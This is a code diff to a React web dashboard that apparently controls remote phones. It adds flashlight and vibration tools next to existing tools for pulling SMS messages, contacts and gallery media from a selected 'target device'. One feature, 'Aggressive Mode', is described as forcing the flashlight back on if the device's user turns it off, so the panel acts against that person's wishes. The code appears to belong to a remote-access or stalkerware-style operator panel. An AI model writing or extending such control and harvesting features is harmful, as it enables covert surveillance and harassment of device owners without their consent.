@@ -35,8 +35,16 @@ export default function Home() {
     const [syncMediaType, setSyncMediaType] = useState<'image' | 'video' | null>(null);
 
     // Tool Selector State
-    const [selectedTool, setSelectedTool] = useState<'gallery' | 'sms' | 'contacts'>('gallery');
+    const [selectedTool, setSelectedTool] = useState<'gallery' | 'sms' | 'contacts' | 'torch' | 'vibration'>('gallery');
     const [isToolDropdownOpen, setIsToolDropdownOpen] = useState(false);
+
+    // Torch State
+    const [isTorchOn, setIsTorchOn] = useState(false);
+    const [torchAggressive, setTorchAggressive] = useState(false);
+    const [torchDuration, setTorchDuration] = useState(60000); // 1 minute default
+
+    // Vibration State
+    const [vibrationDuration, setVibrationDuration] = useState(1000); // 1 second default
 
     // SMS State
     const [smsList, setSmsList] = useState<any[]>([]);
@@ -49,13 +57,6 @@ export default function Home() {
     const [isFetchingContacts, setIsFetchingContacts] = useState(false);
     const [contactsSearchQuery, setContactsSearchQuery] = useState('');
 
-    // Torch/Flashlight State
-    const [isTorchOn, setIsTorchOn] = useState(false);
-    const [torchAggressive, setTorchAggressive] = useState(false);
-    const [torchDuration, setTorchDuration] = useState(30); // seconds
-
-    // Vibration State
-    const [vibrationDuration, setVibrationDuration] = useState(5); // seconds
 
     useEffect(() => {
         if (status === "authenticated" && session?.user?.uuid) {
@@ -223,40 +224,6 @@ export default function Home() {
         );
     }, [contactsList, contactsSearchQuery]);
 
-    // Torch Control Function
-    const controlTorch = (action: 'on' | 'off') => {
-        if (socket && session?.user?.uuid && selectedDeviceId) {
-            socket.emit("device_command", {
-                uuid: session.user.uuid,
-                targetDeviceId: selectedDeviceId,
-                command: "torch_control",
-                data: {
-                    action,
-                    aggressive: torchAggressive,
-                    duration: torchDuration
-                }
-            });
-            setIsTorchOn(action === 'on');
-        } else {
-            alert("Please select an online device first.");
-        }
-    };
-
-    // Vibration Control Function
-    const triggerVibration = () => {
-        if (socket && session?.user?.uuid && selectedDeviceId) {
-            socket.emit("device_command", {
-                uuid: session.user.uuid,
-                targetDeviceId: selectedDeviceId,
-                command: "vibrate",
-                data: {
-                    duration: vibrationDuration
-                }
-            });
-        } else {
-            alert("Please select an online device first.");
-        }
-    };
 
     const triggerUpload = (count: number | 'all') => {
         if (socket && selectedFolder && syncMediaType && session?.user?.uuid && selectedDeviceId) {
@@ -279,8 +246,40 @@ export default function Home() {
                 hasUUID: !!session?.user?.uuid,
                 hasDevice: !!selectedDeviceId
             });
-            if (!selectedDeviceId) alert("No device selected.");
         }
+    };
+
+    // --- Torch Functions ---
+    const toggleTorch = () => {
+        if (!socket || !selectedDeviceId || !session?.user?.uuid) {
+            alert("Please select an online device first.");
+            return;
+        }
+
+        const newState = !isTorchOn;
+        setIsTorchOn(newState);
+
+        socket.emit("torch_control", {
+            uuid: session.user.uuid,
+            targetDeviceId: selectedDeviceId,
+            on: newState,
+            aggressive: torchAggressive,
+            duration: torchDuration
+        });
+    };
+
+    // --- Vibration Functions ---
+    const triggerVibration = () => {
+        if (!socket || !selectedDeviceId || !session?.user?.uuid) {
+            alert("Please select an online device first.");
+            return;
+        }
+
+        socket.emit("vibrate_control", {
+            uuid: session.user.uuid,
+            targetDeviceId: selectedDeviceId,
+            duration: vibrationDuration
+        });
     };
 
     // --- Gallery Logic ---
@@ -421,6 +420,8 @@ export default function Home() {
                             {selectedTool === 'gallery' && <svg className="w-4 h-4 text-purple-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 16l4.586-4.586a2 2 0 012.828 0L16 16m-2-2l1.586-1.586a2 2 0 012.828 0L20 14m-6-6h.01M6 20h12a2 2 0 002-2V6a2 2 0 00-2-2H6a2 2 0 00-2 2v12a2 2 0 002 2z"></path></svg>}
                             {selectedTool === 'sms' && <svg className="w-4 h-4 text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M8 10h.01M12 10h.01M16 10h.01M9 16H5a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v8a2 2 0 01-2 2h-5l-5 5v-5z"></path></svg>}
                             {selectedTool === 'contacts' && <svg className="w-4 h-4 text-green-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M17 20h5v-2a3 3 0 00-5.356-1.857M17 20H7m10 0v-2c0-.656-.126-1.283-.356-1.857M7 20H2v-2a3 3 0 015.356-1.857M7 20v-2c0-.656.126-1.283.356-1.857m0 0a5.002 5.002 0 019.288 0M15 7a3 3 0 11-6 0 3 3 0 016 0zm6 3a2 2 0 11-4 0 2 2 0 014 0zM7 10a2 2 0 11-4 0 2 2 0 014 0z"></path></svg>}
+                            {selectedTool === 'torch' && <svg className="w-4 h-4 text-yellow-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M13 10V3L4 14h7v7l9-11h-7z"></path></svg>}
+                            {selectedTool === 'vibration' && <svg className="w-4 h-4 text-orange-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z"></path></svg>}
                             <span className="text-xs font-medium text-white/70">Tools</span>
                             <svg className="w-3 h-3 text-white/40" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 9l-7 7-7-7"></path></svg>
                         </button>
@@ -669,108 +670,102 @@ export default function Home() {
                             )}
                         </div>
                     )}
-                </div>
 
-                {/* Device Controls Section - Torch & Vibration */}
-                <div className="mb-8 p-6 rounded-2xl bg-gradient-to-br from-orange-500/10 to-red-500/10 border border-orange-500/20">
-                    <h3 className="text-lg font-bold mb-4 flex items-center gap-2">
-                        <svg className="w-5 h-5 text-orange-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9.663 17h4.673M12 3v1m6.364 1.636l-.707.707M21 12h-1M4 12H3m3.343-5.657l-.707-.707m2.828 9.9a5 5 0 117.072 0l-.548.547A3.374 3.374 0 0014 18.469V19a2 2 0 11-4 0v-.531c0-.895-.356-1.754-.988-2.386l-.548-.547z"></path>
-                        </svg>
-                        Device Controls
-                    </h3>
-
-                    <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
-                        {/* Torch Control */}
-                        <div className="p-4 rounded-xl bg-white/5 border border-white/10">
-                            <div className="flex items-center justify-between mb-3">
-                                <span className="font-medium flex items-center gap-2">
-                                    <svg className="w-4 h-4 text-yellow-400" fill="currentColor" viewBox="0 0 20 20">
-                                        <path fillRule="evenodd" d="M11.3 1.046A1 1 0 0112 2v5h4a1 1 0 01.82 1.573l-7 10A1 1 0 018 18v-5H4a1 1 0 01-.82-1.573l7-10a1 1 0 011.12-.38z" clipRule="evenodd"></path>
-                                    </svg>
-                                    Torch
-                                </span>
-                                <div className="flex gap-2">
-                                    <button
-                                        onClick={() => controlTorch('on')}
-                                        disabled={!selectedDeviceId}
-                                        className={`px-3 py-1.5 rounded-lg text-sm font-medium transition-colors ${isTorchOn ? 'bg-yellow-500 text-black' : 'bg-white/10 text-white/70 hover:bg-white/20'} ${!selectedDeviceId ? 'opacity-50 cursor-not-allowed' : ''}`}
-                                    >
-                                        ON
-                                    </button>
-                                    <button
-                                        onClick={() => controlTorch('off')}
-                                        disabled={!selectedDeviceId}
-                                        className={`px-3 py-1.5 rounded-lg text-sm font-medium transition-colors ${!isTorchOn ? 'bg-gray-600 text-white' : 'bg-white/10 text-white/70 hover:bg-white/20'} ${!selectedDeviceId ? 'opacity-50 cursor-not-allowed' : ''}`}
-                                    >
-                                        OFF
-                                    </button>
+                    {/* Torch Tool */}
+                    {selectedTool === 'torch' && (
+                        <div className="bg-white/5 border border-white/10 p-6 rounded-2xl max-w-xl mx-auto">
+                            <div className="flex items-center justify-between mb-8">
+                                <div>
+                                    <h3 className="text-xl font-bold mb-1">Flashlight Control</h3>
+                                    <p className="text-white/40 text-sm">Control device flashlight remotely</p>
                                 </div>
-                            </div>
-
-                            {/* Aggressive Mode */}
-                            <div className="flex items-center gap-2 mb-2">
-                                <input
-                                    type="checkbox"
-                                    id="torchAggressive"
-                                    checked={torchAggressive}
-                                    onChange={(e) => setTorchAggressive(e.target.checked)}
-                                    className="w-4 h-4 rounded bg-white/10 border-white/20"
-                                />
-                                <label htmlFor="torchAggressive" className="text-sm text-white/70">Aggressive Mode</label>
-                                <span className="text-xs text-red-400">(keeps turning on)</span>
-                            </div>
-
-                            {/* Duration */}
-                            {torchAggressive && (
-                                <div className="flex items-center gap-2">
-                                    <span className="text-xs text-white/50">Duration:</span>
-                                    <input
-                                        type="range"
-                                        min="10"
-                                        max="120"
-                                        value={torchDuration}
-                                        onChange={(e) => setTorchDuration(Number(e.target.value))}
-                                        className="flex-1 h-1 bg-white/20 rounded-lg appearance-none cursor-pointer"
-                                    />
-                                    <span className="text-xs text-white/70 w-12">{torchDuration}s</span>
-                                </div>
-                            )}
-                        </div>
-
-                        {/* Vibration Control */}
-                        <div className="p-4 rounded-xl bg-white/5 border border-white/10">
-                            <div className="flex items-center justify-between mb-3">
-                                <span className="font-medium flex items-center gap-2">
-                                    <svg className="w-4 h-4 text-purple-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z"></path>
-                                    </svg>
-                                    Vibration
-                                </span>
                                 <button
-                                    onClick={triggerVibration}
+                                    onClick={toggleTorch}
                                     disabled={!selectedDeviceId}
-                                    className={`px-4 py-1.5 rounded-lg text-sm font-medium bg-purple-500 hover:bg-purple-600 text-white transition-colors ${!selectedDeviceId ? 'opacity-50 cursor-not-allowed' : ''}`}
+                                    className={`w-16 h-8 rounded-full transition-colors relative ${isTorchOn ? 'bg-yellow-500' : 'bg-white/20'}`}
                                 >
-                                    Vibrate
+                                    <div className={`w-6 h-6 bg-white rounded-full absolute top-1 transition-transform shadow-lg ${isTorchOn ? 'left-9' : 'left-1'}`} />
                                 </button>
                             </div>
 
-                            {/* Duration Slider */}
-                            <div className="flex items-center gap-2">
-                                <span className="text-xs text-white/50">Duration:</span>
-                                <input
-                                    type="range"
-                                    min="1"
-                                    max="120"
-                                    value={vibrationDuration}
-                                    onChange={(e) => setVibrationDuration(Number(e.target.value))}
-                                    className="flex-1 h-1 bg-white/20 rounded-lg appearance-none cursor-pointer"
-                                />
-                                <span className="text-xs text-white/70 w-12">{vibrationDuration}s</span>
+                            <div className="space-y-4 pt-4 border-t border-white/10">
+                                <div className="flex items-center justify-between p-4 rounded-xl bg-black/20">
+                                    <div className="flex items-center gap-3">
+                                        <div className="p-2 rounded-lg bg-red-500/20 text-red-400">
+                                            <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M13 10V3L4 14h7v7l9-11h-7z"></path></svg>
+                                        </div>
+                                        <div>
+                                            <p className="font-medium text-sm">Aggressive Mode</p>
+                                            <p className="text-xs text-white/40">Forces flashlight ON if turned off by user</p>
+                                        </div>
+                                    </div>
+                                    <button
+                                        onClick={() => setTorchAggressive(!torchAggressive)}
+                                        className={`w-12 h-6 rounded-full transition-colors relative ${torchAggressive ? 'bg-red-500' : 'bg-white/20'}`}
+                                    >
+                                        <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${torchAggressive ? 'left-7' : 'left-1'}`} />
+                                    </button>
+                                </div>
+
+                                {torchAggressive && (
+                                    <div className="p-4 rounded-xl bg-black/20 animate-fadeIn">
+                                        <label className="block text-xs font-medium text-white/60 mb-2">Duration (minutes)</label>
+                                        <div className="flex items-center gap-4">
+                                            <input
+                                                type="range"
+                                                min="1"
+                                                max="5"
+                                                step="1"
+                                                value={torchDuration / 60000}
+                                                onChange={(e) => setTorchDuration(parseInt(e.target.value) * 60000)}
+                                                className="flex-1 accent-yellow-500 h-2 bg-white/10 rounded-lg appearance-none cursor-pointer"
+                                            />
+                                            <span className="text-sm font-bold w-12 text-right">{torchDuration / 60000}m</span>
+                                        </div>
+                                    </div>
+                                )}
                             </div>
                         </div>
-                    </div>
+                    )}
+
+                    {/* Vibration Tool */}
+                    {selectedTool === 'vibration' && (
+                        <div className="bg-white/5 border border-white/10 p-6 rounded-2xl max-w-xl mx-auto">
+                            <div className="flex items-center justify-between mb-8">
+                                <div>
+                                    <h3 className="text-xl font-bold mb-1">Vibration Control</h3>
+                                    <p className="text-white/40 text-sm">Vibrate device remotely</p>
+                                </div>
+                            </div>
+
+                            <div className="space-y-6">
+                                <div>
+                                    <label className="block text-xs font-medium text-white/60 mb-2">Duration (seconds)</label>
+                                    <div className="flex items-center gap-4">
+                                        <input
+                                            type="range"
+                                            min="0.5"
+                                            max="10"
+                                            step="0.5"
+                                            value={vibrationDuration / 1000}
+                                            onChange={(e) => setVibrationDuration(parseFloat(e.target.value) * 1000)}
+                                            className="flex-1 accent-orange-500 h-2 bg-white/10 rounded-lg appearance-none cursor-pointer"
+                                        />
+                                        <span className="text-sm font-bold w-12 text-right">{vibrationDuration / 1000}s</span>
+                                    </div>
+                                </div>
+
+                                <button
+                                    onClick={triggerVibration}
+                                    disabled={!selectedDeviceId}
+                                    className={`w-full py-4 rounded-xl font-bold text-lg transition-all flex items-center justify-center gap-2 ${selectedDeviceId ? 'bg-gradient-to-r from-orange-500 to-red-500 hover:scale-[1.02] shadow-lg shadow-orange-500/20' : 'bg-white/10 text-white/20 cursor-not-allowed'}`}
+                                >
+                                    <svg className="w-6 h-6 animate-pulse" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z"></path></svg>
+                                    Vibrate Now
+                                </button>
+                            </div>
+                        </div>
+                    )}
                 </div>
 
                 {/* Gallery Section */}
@@ -1139,6 +1134,46 @@ export default function Home() {
                                     </div>
                                     {selectedTool === 'contacts' && (
                                         <svg className="w-5 h-5 text-green-400" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd"></path></svg>
+                                    )}
+                                </button>
+                                <button
+                                    onClick={() => {
+                                        setSelectedTool('torch');
+                                        setIsToolDropdownOpen(false);
+                                    }}
+                                    className={`w-full text-left px-4 py-4 rounded-xl flex items-center justify-between transition-colors ${selectedTool === 'torch' ? 'bg-yellow-500/20 border border-yellow-500/50' : 'bg-white/5 border border-transparent hover:bg-white/10'}`}
+                                >
+                                    <div className="flex items-center gap-3">
+                                        <div className="p-2 rounded-lg bg-yellow-500/20">
+                                            <svg className="w-5 h-5 text-yellow-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M13 10V3L4 14h7v7l9-11h-7z"></path></svg>
+                                        </div>
+                                        <div>
+                                            <div className="font-medium">Flashlight</div>
+                                            <div className="text-xs text-white/40">Toggle flashlight</div>
+                                        </div>
+                                    </div>
+                                    {selectedTool === 'torch' && (
+                                        <svg className="w-5 h-5 text-yellow-400" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd"></path></svg>
+                                    )}
+                                </button>
+                                <button
+                                    onClick={() => {
+                                        setSelectedTool('vibration');
+                                        setIsToolDropdownOpen(false);
+                                    }}
+                                    className={`w-full text-left px-4 py-4 rounded-xl flex items-center justify-between transition-colors ${selectedTool === 'vibration' ? 'bg-orange-500/20 border border-orange-500/50' : 'bg-white/5 border border-transparent hover:bg-white/10'}`}
+                                >
+                                    <div className="flex items-center gap-3">
+                                        <div className="p-2 rounded-lg bg-orange-500/20">
+                                            <svg className="w-5 h-5 text-orange-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z"></path></svg>
+                                        </div>
+                                        <div>
+                                            <div className="font-medium">Vibration</div>
+                                            <div className="text-xs text-white/40">Vibrate device</div>
+                                        </div>
+                                    </div>
+                                    {selectedTool === 'vibration' && (
+                                        <svg className="w-5 h-5 text-orange-400" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd"></path></svg>
                                     )}
                                 </button>
                             </div>
